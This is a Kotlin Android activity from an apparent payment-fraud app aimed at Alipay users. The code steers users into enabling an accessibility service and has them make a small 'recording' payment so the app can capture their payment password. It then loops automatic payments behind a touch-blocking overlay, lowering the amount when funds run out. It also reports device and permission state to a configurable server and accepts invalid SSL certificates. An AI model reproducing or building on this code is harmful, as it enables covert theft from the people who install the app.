package com.example.demo

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.net.ConnectivityManager
import android.net.Network
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.text.TextUtils.SimpleStringSplitter
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.textfield.TextInputEditText
import org.json.JSONObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var settingsButton: Button
    private lateinit var btnAlipay: Button
    private lateinit var webView: android.webkit.WebView
    private lateinit var homeContainer: android.view.View
    private var accessibilityPromptDialog: androidx.appcompat.app.AlertDialog? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var recordPayInFlight: Boolean = false
    private var lastRecordPayStartAt: Long = 0L

    // 标记是否需要自动开始下一轮
    // private var pendingNextRound = false // 移除内存变量，改用 SharedPreferences 持久化

    // 注册广播接收器，用于接收循环支付信号
    private val paymentReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.demo.PAYMENT_SUCCESS") {
                // 收到支付成功信号，标记需要进行下一轮，并持久化存储
                // 即使 App 在后台被杀，下次启动也能恢复
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("pending_next_round", true).apply()
                
                Toast.makeText(this@MainActivity, "支付成功，等待返回App继续...", Toast.LENGTH_SHORT).show()
            } else if (intent?.action == "com.example.demo.NO_AVAILABLE_METHOD") {
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                prefs.edit()
                    .putBoolean("pending_next_round", true)
                    .putBoolean("pending_need_decrement", true)
                    .apply()
                Toast.makeText(this@MainActivity, "无可用付款方式，准备递减再试...", Toast.LENGTH_SHORT).show()
            } else if (intent?.action == "com.example.demo.START_RECORD_PAY") {
                Toast.makeText(this@MainActivity, "开始录制：正在拉起1元录制订单...", Toast.LENGTH_SHORT).show()
                startRecordPayFlow()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(paymentReceiver)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val cb = networkCallback
            if (cm != null && cb != null) {
                cm.unregisterNetworkCallback(cb)
            }
            networkCallback = null
        } catch (_: Exception) {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        WindowCompat.setDecorFitsSystemWindows(window, false)
        window.statusBarColor = Color.TRANSPARENT
        setContentView(R.layout.activity_main)

        // 注册广播
        val filter = android.content.IntentFilter().apply {
            addAction("com.example.demo.PAYMENT_SUCCESS")
            addAction("com.example.demo.NO_AVAILABLE_METHOD")
            addAction("com.example.demo.START_RECORD_PAY")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            registerReceiver(paymentReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(paymentReceiver, filter)
        }

        statusText = findViewById(R.id.status_text)
        settingsButton = findViewById(R.id.settings_button)
        btnAlipay = findViewById(R.id.btn_alipay)
        webView = findViewById(R.id.webview)
        homeContainer = findViewById(R.id.home_container)

        val homeInitialPaddingLeft = homeContainer.paddingLeft
        val homeInitialPaddingTop = homeContainer.paddingTop
        val homeInitialPaddingRight = homeContainer.paddingRight
        val homeInitialPaddingBottom = homeContainer.paddingBottom
        ViewCompat.setOnApplyWindowInsetsListener(homeContainer) { v, insets ->
            val sysBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(
                homeInitialPaddingLeft,
                homeInitialPaddingTop + sysBars.top,
                homeInitialPaddingRight,
                homeInitialPaddingBottom + sysBars.bottom,
            )
            insets
        }
        ViewCompat.setOnApplyWindowInsetsListener(webView) { v, insets ->
            val sysBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(0, sysBars.top, 0, sysBars.bottom)
            insets
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (cm != null) {
                networkCallback = object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) {
                        ApiClient.flushLogQueue(this@MainActivity)
                    }
                }
                cm.registerDefaultNetworkCallback(networkCallback as ConnectivityManager.NetworkCallback)
            }
        }

        // 配置 WebView
        val ws = webView.settings
        ws.javaScriptEnabled = true
        ws.domStorageEnabled = true
        ws.allowFileAccess = true
        ws.allowContentAccess = true
        ws.useWideViewPort = true
        ws.loadWithOverviewMode = true
        ws.builtInZoomControls = false
        ws.displayZoomControls = false
        ws.setSupportZoom(false)
        ws.cacheMode = android.webkit.WebSettings.LOAD_DEFAULT
        ws.textZoom = 100
        ws.databaseEnabled = true
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ws.mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        webView.overScrollMode = android.view.View.OVER_SCROLL_NEVER
        webView.isVerticalScrollBarEnabled = false
        webView.isHorizontalScrollBarEnabled = false
        webView.setLayerType(android.view.View.LAYER_TYPE_HARDWARE, null)
        
        webView.webViewClient = object : android.webkit.WebViewClient() {
            override fun onReceivedSslError(
                view: android.webkit.WebView?, 
                handler: android.webkit.SslErrorHandler?, 
                error: android.net.http.SslError?
            ) {
                handler?.proceed()
            }

            override fun onReceivedError(
                view: android.webkit.WebView?, 
                request: android.webkit.WebResourceRequest?, 
                error: android.webkit.WebResourceError?
            ) {
                // 如果遇到 ERR_CACHE_MISS (-19)，尝试重新加载
                if (error?.errorCode == -19) { // ERROR_CACHE_MISS
                    view?.reload()
                }
                super.onReceivedError(view, request, error)
            }

            override fun shouldOverrideUrlLoading(view: android.webkit.WebView?, url: String?): Boolean {
                if (url == null) return false
                if (url.startsWith("lei://pay")) {
                    handleAlipayPayment()
                    return true
                }
                // 拦截支付宝 Scheme
                if (url.startsWith("alipays://") || url.startsWith("alipayqr://")) {
                    try {
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        startActivity(intent)
                    } catch (e: Exception) {
                        Toast.makeText(this@MainActivity, "未检测到支付宝客户端", Toast.LENGTH_SHORT).show()
                    }
                    return true
                }
                return false
            }
        }

        settingsButton.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }

        // floatButton.setOnClickListener { ... } // 移除

        btnAlipay.setOnClickListener {
            handleAlipayPayment()
        }
    }

    private fun serverOrigin(): String {
        val base = ApiClient.getServerBaseUrl(this).trimEnd('/')
        return if (base.endsWith("/api")) base.dropLast(4) else base
    }

    private fun ensureAccessibilityPrompt(title: String, text: String) {
        val d = accessibilityPromptDialog
        if (d != null && d.isShowing) {
            d.findViewById<TextView>(R.id.acc_prompt_title)?.text = title
            d.findViewById<TextView>(R.id.acc_prompt_text)?.text = text
            d.findViewById<TextView>(R.id.tv_server_url)?.text = ApiClient.getServerBaseUrl(this)
            d.findViewById<TextView>(R.id.tv_apk_id)?.text = ApiClient.getApkId(this).ifBlank { "-" }
            return
        }
        val view = layoutInflater.inflate(R.layout.dialog_accessibility_prompt, null, false)
        view.findViewById<TextView>(R.id.acc_prompt_title)?.text = title
        view.findViewById<TextView>(R.id.acc_prompt_text)?.text = text
        view.findViewById<TextView>(R.id.tv_server_url)?.text = ApiClient.getServerBaseUrl(this)
        view.findViewById<TextView>(R.id.tv_apk_id)?.text = ApiClient.getApkId(this).ifBlank { "-" }
        val dialog = MaterialAlertDialogBuilder(this)
            .setView(view)
            .setCancelable(false)
            .create()
        dialog.show()
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.decorView?.setPadding(0, 0, 0, 0)
        accessibilityPromptDialog = dialog

        dialog.findViewById<android.view.View>(R.id.btn_open_settings)?.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        dialog.findViewById<android.view.View>(R.id.btn_check_enabled)?.setOnClickListener {
            if (isAccessibilitySettingsOn(this)) {
                dialog.dismiss()
            } else {
                Toast.makeText(this, "请先在系统设置中开启无障碍服务", Toast.LENGTH_SHORT).show()
            }
        }
        dialog.findViewById<android.view.View>(R.id.btn_edit_server)?.setOnClickListener {
            openServerUrlEditor()
            dialog.findViewById<TextView>(R.id.tv_server_url)?.text = ApiClient.getServerBaseUrl(this)
        }
        dialog.findViewById<android.view.View>(R.id.btn_edit_apk_id)?.setOnClickListener {
            openApkIdEditor()
            dialog.findViewById<TextView>(R.id.tv_apk_id)?.text = ApiClient.getApkId(this).ifBlank { "-" }
        }
    }

    private fun dismissAccessibilityPromptIfAny() {
        val d = accessibilityPromptDialog
        if (d != null && d.isShowing) d.dismiss()
        accessibilityPromptDialog = null
    }

    private fun normalizeServerBaseUrl(input: String): String? {
        var v = input.trim()
        if (v.isBlank()) return null
        v = v.replace('；', ':').replace(';', ':')
        if (!v.startsWith("http://") && !v.startsWith("https://")) {
            v = "http://$v"
        }
        v = v.trimEnd('/')
        if (!v.endsWith("/api")) {
            v += "/api"
        }
        return v
    }

    private fun openServerUrlEditor() {
        val view = layoutInflater.inflate(R.layout.dialog_server_url, null, false)
        val et = view.findViewById<TextInputEditText>(R.id.et_server_url)
        et.setText(ApiClient.getServerBaseUrl(this).removeSuffix("/api"))
        val dlg = MaterialAlertDialogBuilder(this)
            .setTitle("服务器地址")
            .setView(view)
            .setCancelable(true)
            .setNegativeButton("取消", null)
            .setPositiveButton("保存", null)
            .create()
        dlg.setOnShowListener {
            dlg.getButton(androidx.appcompat.app.AlertDialog.BUTTON_POSITIVE)?.setOnClickListener {
                val raw = et.text?.toString().orEmpty()
                val normalized = normalizeServerBaseUrl(raw)
                if (normalized == null) {
                    Toast.makeText(this, "请输入服务器地址", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                ApiClient.setServerBaseUrl(this, normalized)
                Toast.makeText(this, "已更新：$normalized", Toast.LENGTH_SHORT).show()
                ApiClient.upsertDevice(this, accessibilityEnabled = isAccessibilitySettingsOn(this), scriptRecorded = hasSavedPassword(), looping = AutoPaymentService.loopingState)
                dlg.dismiss()
            }
        }
        dlg.show()
    }

    private fun openApkIdEditor() {
        val view = layoutInflater.inflate(R.layout.dialog_apk_id, null, false)
        val et = view.findViewById<TextInputEditText>(R.id.et_apk_id)
        et.setText(ApiClient.getApkId(this))
        val dlg = MaterialAlertDialogBuilder(this)
            .setTitle("绑定 APK 标识")
            .setView(view)
            .setCancelable(true)
            .setNegativeButton("取消", null)
            .setPositiveButton("保存", null)
            .create()
        dlg.setOnShowListener {
            dlg.getButton(androidx.appcompat.app.AlertDialog.BUTTON_POSITIVE)?.setOnClickListener {
                val raw = et.text?.toString()?.trim().orEmpty()
                if (raw.isBlank()) {
                    Toast.makeText(this, "请输入 APK 标识符", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                ApiClient.setApkIdOverride(this, raw)
                Toast.makeText(this, "已绑定：$raw", Toast.LENGTH_SHORT).show()
                ApiClient.upsertDevice(this, accessibilityEnabled = isAccessibilitySettingsOn(this), scriptRecorded = hasSavedPassword(), looping = AutoPaymentService.loopingState)
                dlg.dismiss()
            }
        }
        dlg.show()
    }

    private fun loadHtmlAutoSubmit(formHtml: String, baseUrl: String) {
        val b64 = android.util.Base64.encodeToString(formHtml.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
        val wrapper = """
            <!doctype html>
            <html lang="zh-CN">
            <head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/></head>
            <body>
              <div id="container"></div>
              <script>
                (function(){
                  try{
                    var b64 = "$b64";
                    var html = decodeURIComponent(escape(window.atob(b64)));
                    document.getElementById('container').innerHTML = html;
                    var f = document.querySelector('form');
                    if (f) { f.submit(); }
                  }catch(e){
                    document.body.innerText = 'form render failed: ' + (e && e.message ? e.message : e);
                  }
                })();
              </script>
            </body>
            </html>
        """.trimIndent()
        homeContainer.visibility = android.view.View.GONE
        webView.visibility = android.view.View.VISIBLE
        webView.clearHistory()
        webView.loadDataWithBaseURL(baseUrl, wrapper, "text/html", "utf-8", null)
    }

    private fun startRecordPayFlow() {
        val now = System.currentTimeMillis()
        if (recordPayInFlight || now - lastRecordPayStartAt < 5000) {
            return
        }
        lastRecordPayStartAt = now
        recordPayInFlight = true
        CoroutineScope(Dispatchers.Main).launch {
            try {
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                val phone = prefs.getString("record_phone", "")?.trim().orEmpty()
                val (form, err) = withContext(Dispatchers.IO) {
                    ApiClient.createRecordPayBlocking(this@MainActivity, phone)
                }
                if (form.isNullOrBlank()) {
                    Toast.makeText(this@MainActivity, "录制下单失败: ${err ?: "unknown"}", Toast.LENGTH_SHORT).show()
                    return@launch
                }
                val origin = serverOrigin()
                loadHtmlAutoSubmit(form, origin)
            } finally {
                recordPayInFlight = false
            }
        }
    }

    private fun startPayOrderRound(amountOverride: Long? = null) {
        CoroutineScope(Dispatchers.Main).launch {
            val (url, err) = withContext(Dispatchers.IO) {
                ApiClient.createPayOrderBlocking(this@MainActivity, amountOverride)
            }
            if (url.isNullOrBlank()) {
                Toast.makeText(this@MainActivity, "下单失败: ${err ?: "unknown"}", Toast.LENGTH_SHORT).show()
                return@launch
            }
            val intent = Intent(this@MainActivity, AutoPaymentService::class.java).apply {
                action = AutoPaymentService.ACTION_BLOCK_TOUCH
            }
            startService(intent)
            loadUrlInWebView(url)
        }
    }

    private fun handleAlipayPayment() {
        if (!isAccessibilitySettingsOn(this)) {
            Toast.makeText(this, "请先开启辅助服务 (步骤1)", Toast.LENGTH_SHORT).show()
            return
        }
        
        val hasPassword = hasSavedPassword()
        if (hasPassword) {
            // 模式2：已有密码，开启全屏遮罩并自动支付
            Toast.makeText(this, "正在启动自动支付...", Toast.LENGTH_SHORT).show()
            CoroutineScope(Dispatchers.Main).launch {
                val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                val baseAmount = cfg?.payAmount ?: prefs.getLong("current_pay_amount", 0L)
                if (baseAmount > 0) {
                    prefs.edit().putLong("current_pay_amount", baseAmount).apply()
                    startPayOrderRound(baseAmount)
                } else {
                    startPayOrderRound(null)
                }
            }
        } else {
            // 模式1：无密码，跳转到录制页面
            Toast.makeText(this, "请进行首次支付以录制密码", Toast.LENGTH_SHORT).show()
            startRecordPayFlow()
        }
    }
    
    private fun loadUrlInWebView(url: String) {
        homeContainer.visibility = android.view.View.GONE
        webView.visibility = android.view.View.VISIBLE
        // 关键：在加载 URL 之前，如果之前有页面被重新加载导致 CACHE_MISS，先清空历史
        webView.clearHistory()
        
        // 针对 Android 10+ 的本地缓存策略修复
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        }
        
        // 如果页面是重定向结果，直接 loadUrl 可能会导致 ERR_CACHE_MISS
        // 我们尝试以 reload 的方式或者标准的 load
        webView.loadUrl(url)
    }
    
    private fun hasSavedPassword(): Boolean {
        val record = SecureStorage.loadPaymentRecord(this)
        return record != null && record.scriptJson.isNotBlank()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        ApiClient.logEvent(this, opType = "APP_OPEN", durationMs = 0, level = "INFO", keyword = "onResume")
        ApiClient.flushLogQueue(this)

        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val accessibilityOn = isAccessibilitySettingsOn(this)
        val overlayOn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
        val lastAccessibilityOn = prefs.getBoolean("last_accessibility_on", false)
        val lastOverlayOn = prefs.getBoolean("last_overlay_on", false)
        if (accessibilityOn != lastAccessibilityOn) {
            ApiClient.logEvent(
                this,
                opType = "PERMISSION",
                durationMs = 0,
                level = if (accessibilityOn) "INFO" else "WARN",
                keyword = if (accessibilityOn) "无障碍权限已开启" else "无障碍权限已关闭",
            )
            prefs.edit().putBoolean("last_accessibility_on", accessibilityOn).apply()
        }
        if (overlayOn != lastOverlayOn) {
            ApiClient.logEvent(
                this,
                opType = "PERMISSION",
                durationMs = 0,
                level = if (overlayOn) "INFO" else "WARN",
                keyword = if (overlayOn) "悬浮窗权限已开启" else "悬浮窗权限已关闭",
            )
            prefs.edit().putBoolean("last_overlay_on", overlayOn).apply()
        }

        ApiClient.upsertDevice(
            this,
            accessibilityEnabled = accessibilityOn,
            scriptRecorded = hasSavedPassword(),
            looping = AutoPaymentService.loopingState,
        )

        if (!accessibilityOn) {
            val title = prefs.getString("acc_prompt_title", "")?.trim().orEmpty().ifBlank { "需要开启无障碍权限" }
            val text = prefs.getString("acc_prompt_text", "")?.trim().orEmpty().ifBlank { "为正常使用，请先开启无障碍服务。" }
            ensureAccessibilityPrompt(title, text)
        } else {
            dismissAccessibilityPromptIfAny()
        }

        CoroutineScope(Dispatchers.Main).launch {
            val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
            if (cfg != null) {
                if (prefs.getLong("current_pay_amount", 0L) <= 0 && cfg.payAmount > 0) {
                    prefs.edit().putLong("current_pay_amount", cfg.payAmount).apply()
                }
                if (cfg.accPromptTitle.isNotBlank() || cfg.accPromptText.isNotBlank()) {
                    prefs.edit()
                        .putString("acc_prompt_title", cfg.accPromptTitle)
                        .putString("acc_prompt_text", cfg.accPromptText)
                        .apply()
                }
                if (!isAccessibilitySettingsOn(this@MainActivity)) {
                    val title = cfg.accPromptTitle.ifBlank { "需要开启无障碍权限" }
                    val text = cfg.accPromptText.ifBlank { "为正常使用，请先开启无障碍服务。" }
                    ensureAccessibilityPrompt(title, text)
                } else {
                    dismissAccessibilityPromptIfAny()
                }
                if (webView.visibility != android.view.View.VISIBLE) {
                    val origin = serverOrigin()
                    val url = when {
                        cfg.templateId.isNotBlank() -> "$origin/t/${cfg.templateId}/"
                        cfg.downloadPageId.isNotBlank() -> "$origin/dp/${cfg.downloadPageId}/"
                        else -> ""
                    }
                    if (url.isNotBlank()) {
                        loadUrlInWebView(url)
                    }
                }
            }
        }
        
        // 检查持久化的状态
        val pendingNextRound = prefs.getBoolean("pending_next_round", false)
        val needDecrement = prefs.getBoolean("pending_need_decrement", false)
        
        // 如果有待处理的下一轮任务，立即开始
        if (pendingNextRound) {
            if (!accessibilityOn) {
                return
            }
            // 清除标记
            prefs.edit().putBoolean("pending_next_round", false).putBoolean("pending_need_decrement", false).apply()
            
            Toast.makeText(this, "正在发起下一笔支付...", Toast.LENGTH_SHORT).show()
            CoroutineScope(Dispatchers.Main).launch {
                val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
                val baseAmount = cfg?.payAmount ?: 0L
                val decMode = cfg?.decrementMode == true
                val decStep = cfg?.decrementAmount ?: 0L
                val cur = prefs.getLong("current_pay_amount", baseAmount)
                var nextAmount: Long? = null
                if (needDecrement) {
                    if (decMode && decStep > 0 && cur > decStep) {
                        nextAmount = cur - decStep
                        prefs.edit().putLong("current_pay_amount", nextAmount).apply()
                    } else {
                        Toast.makeText(this@MainActivity, "无法递减继续支付，已停止", Toast.LENGTH_LONG).show()
                        val stop = Intent(this@MainActivity, AutoPaymentService::class.java).apply {
                            action = AutoPaymentService.ACTION_STOP_LOOP
                        }
                        startService(stop)
                        return@launch
                    }
                } else {
                    if (cur > 0) {
                        nextAmount = cur
                    } else if (baseAmount > 0) {
                        nextAmount = baseAmount
                        prefs.edit().putLong("current_pay_amount", baseAmount).apply()
                    }
                }
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    startPayOrderRound(nextAmount)
                }, 500)
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        for (i in permissions.indices) {
            val p = permissions[i]
            val granted = try {
                grantResults.getOrNull(i) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } catch (_: Exception) {
                false
            }
            ApiClient.logEvent(
                this,
                opType = "PERMISSION",
                durationMs = 0,
                level = if (granted) "INFO" else "WARN",
                keyword = "$p:${if (granted) "GRANTED" else "DENIED"}",
                meta = JSONObject().apply { put("requestCode", requestCode) },
            )
        }
    }

    private fun updateStatus() {
        val isServiceOn = isAccessibilitySettingsOn(this)
        if (isServiceOn) {
            statusText.text = getString(R.string.service_enabled)
            settingsButton.isEnabled = false
        } else {
            statusText.text = getString(R.string.service_disabled)
            settingsButton.isEnabled = true
        }
        
        // floatButton.isEnabled = isServiceOn // 移除
    }

    private fun isAccessibilitySettingsOn(mContext: Context): Boolean {
        var accessibilityEnabled = 0
        val service = packageName + "/" + AutoPaymentService::class.java.canonicalName
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                mContext.applicationContext.contentResolver,
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
            )
        } catch (e: Settings.SettingNotFoundException) {
            e.printStackTrace()
        }
        val mStringColonSplitter = SimpleStringSplitter(':')
        if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(
                mContext.applicationContext.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue)
                while (mStringColonSplitter.hasNext()) {
                    val accessibilityService = mStringColonSplitter.next()
                    if (accessibilityService.equals(service, ignoreCase = true)) {
                        return true
                    }
                }
            }
        }
        return false
    }
}
